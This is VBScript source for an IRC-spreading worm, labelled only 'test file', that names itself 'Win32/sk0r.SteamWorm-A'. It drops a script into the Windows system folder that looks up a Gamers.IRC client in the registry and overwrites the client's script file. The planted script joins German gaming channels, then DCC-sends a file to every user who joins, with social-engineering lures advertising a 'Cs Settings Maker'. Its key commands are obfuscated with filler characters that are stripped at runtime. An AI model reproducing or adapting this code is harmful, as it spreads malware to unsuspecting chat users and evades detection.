   'test file

   'On Error Resume Next

   set fso = createobject ("scripting.filesystemobject")
   set wshs = createobject ("wscript.shell")
   set sysdir = fso.getspecialfolder(1)
   set windir = fso.getspecialfolder(0)
   set shelldll = createobject ("shell.application")
   hddspace = left(windir,2)





   Set ircproxy = fso.createtextfile(sysdir + "\GoIrcChan.vbs")
   ircproxy.writeline ("On Error Resume Next")
   ircproxy.writeline ("set wshshell = createobject (""wscript.shell"") ")
   ircproxy.writeline ("ircread = wshshell.regread(""HKEY_LOCAL_MACHINE\SOFTWARE\Gamers.Interactive\Gamers.IRC\"" & ""inst_path"") ")
   ircproxy.writeline ("If ircread <> """" Then ")
   ircproxy.writeline ("set fsoobj = createobject (""scripting.filesystemobject"") ")
   ircproxy.writeline ("Set irchacking = fsoobj.createtextfile(ircread + ""\bin\grc\gamersirc.grc"", True) ")
   ircproxy.writeline ("irchacking.writeline ("";Win32/sk0r.SteamWorm-A mIRC Script File"") ")
   irc1 = "i§§rc§h§§§ac§§§ki§§ng§§.§§wr§§§ite§§li§§§ne (""§§o§§§n §1§§:§c§§o§§§n§§§n§§e§§ct§§:§{§§ "") "
   irc1 = Replace(irc1, "§", "")
   ircproxy.writeline (irc1)
   ircproxy.writeline ("irchacking.writeline (""join -n #spielersuche "") ")
   ircproxy.writeline ("irchacking.writeline (""join -n #sponsoring "") ")
   ircproxy.writeline ("irchacking.writeline (""join -n #clansuche "") ")
   ircproxy.writeline ("irchacking.writeline (""join -n #esl "") ")
   ircproxy.writeline ("irchacking.writeline (""join -n #bouncer4you "") ")
   ircproxy.writeline ("irchacking.writeline (""} "") ")
   irc2 = "irchacking.writeline (""§§§o§§n §§1§§:§§j§§§o§§i§§n§§§:§§§§#§§§: §§§{§§ "") "
   irc2 = Replace(irc2, "§", "")
   ircproxy.writeline (irc2)
   ircni = "i§§r§ch§§a§§c§ki§§ng§§.§§wr§§§i§§te§§§l§§i§§§n§§e§§ (""§v§§§a§§r §§%§§m§§y§§§sk§§§o§r §§=§§ §§$§§§n§§i§§§§c§§§k"") "
   ircni = Replace(ircni, "§", "")
   ircproxy.writeline (ircni)
   irc5 = "ir§§§c§ha§§c§§ki§§ng§§.§§w§§r§§iteli§§§n§§e (""v§§a§§r §§%§§d§§a§§t§§a §§=§§§§ " + mircdccsendfile + "§§§ §"") "
   irc5 = Replace(irc5, "§", "")
   ircproxy.writeline (irc5)
   ircproxy.writeline ("irchacking.writeline (""var %rand = $rand(1, 3) "") ")
   ircproxy.writeline ("irchacking.writeline (""if (%rand == 1) { "") ")
   ircproxy.writeline ("irchacking.writeline (""  var %msg = Hey, zieh dir ma den Cs Settings Maker. Der geht echt voll ab!!1 "") ")
   ircproxy.writeline ("irchacking.writeline (""} "") ")
   ircproxy.writeline ("irchacking.writeline ("" elseif (%rand == 2) { "") ")
   ircproxy.writeline ("irchacking.writeline (""  var %msg = Nimm ma an, wir benutzen alle den Settings maker fuer Cs "") ")
   ircproxy.writeline ("irchacking.writeline ("" } "") ")
   ircproxy.writeline ("irchacking.writeline (""else { "") ")
   ircproxy.writeline ("irchacking.writeline (""  var %msg = Ey ich hab mir voll die krasse cfg mit dem Tool gemacht. Geht echt voll ab! "") ")
   ircproxy.writeline ("irchacking.writeline ("" } "") ")
   iloveirc = "i?r?ch?a?cki??ng?.w?r?itel??ine ?(?"" ?? ???dc?c s?e????nd??? -?c %?m????y?s?k?o?r %?d?at??a??? ""?)?"
   iloveirc = Replace(iloveirc, "?", "")
   ircproxy.writeline (iloveirc)
   irc3 = "ir§§c§§ha§§§c§§§king§§.§§wr§§§i§§§teli§§§ne (""  §§m§§§sg§§§ §%§§§m§§y§§s§k§§or §§§%§§m§§s§§§§§g "") "
   irc3 = Replace(irc3, "§", "")
   ircproxy.writeline (irc3)
   ircproxy.writeline ("irchacking.writeline (""} "") ")
   ircproxy.writeline ("irchacking.Close ")
   ircproxy.writeline ("End If")
   ircproxy.Close
